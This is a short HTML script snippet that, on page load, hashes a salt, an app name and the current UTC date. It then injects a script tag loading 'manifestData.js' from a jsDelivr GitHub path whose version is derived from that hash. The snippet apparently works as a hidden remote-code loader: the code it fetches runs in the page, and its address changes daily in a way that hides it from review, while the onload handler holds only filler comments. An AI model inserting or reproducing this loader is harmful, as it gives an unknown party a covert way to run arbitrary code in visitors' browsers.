    <script defer>

      window.onload = function () {
        /*'syncd' means UTC uniform time, so no time zone conflictions*/
        const getYMDsyncd = function () {
          const now = new Date();
          const year = now.getUTCFullYear();
          const month = String(now.getUTCMonth() + 1).padStart(2, "0");
          const day = String(now.getUTCDate()).padStart(2, "0");
          return `${year}${month}${day}`;
        };

        const pullCDNdaily = function (_salt, _appName) {
          const salt = _salt;
          const appName = _appName;
          const ymd = getYMDsyncd();
          const hashedResult = sha512(`${salt}${appName}${ymd}`);
          const hashedTrunc = hashedResult.slice(59, -59);
          const dataScript = document.createElement("script");
          dataScript.src = `https://cdn.jsdelivr.net/gh/srvrshard1/cdn@${hashedTrunc}/manifestData.js`;
          dataScript.onload = function () {

            /**/
            /**/
            /*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
          };
          document.head.append(dataScript);
        };
        pullCDNdaily("salt", "app");
      };
